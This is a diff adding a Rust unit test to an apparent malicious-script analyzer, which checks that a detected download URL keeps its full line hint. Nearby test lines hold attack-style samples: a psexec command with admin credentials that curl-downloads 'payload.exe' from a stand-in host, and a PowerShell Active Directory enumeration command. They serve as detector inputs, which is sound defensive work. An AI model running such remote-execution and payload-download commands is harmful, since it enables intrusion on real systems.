@@ -4866,6 +4866,27 @@ powershell -Command "Get-ADComputer -Filter *"
     }
 
     #[test]
+    fn deob_text_download_line_hint_is_not_truncated() {
+        let url = "https://line-hint-full.example/payload";
+        let long_marker = "tail-marker-preserved-in-download-line-hint";
+        let script = format!(
+            "echo suspicious-line {url} {} {long_marker}\r\n",
+            "padding-token ".repeat(24)
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DownloadInDeobText { src, line_hint }
+                    if src == url && line_hint.contains(long_marker)
+            )),
+            "DownloadInDeobText line hint was truncated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
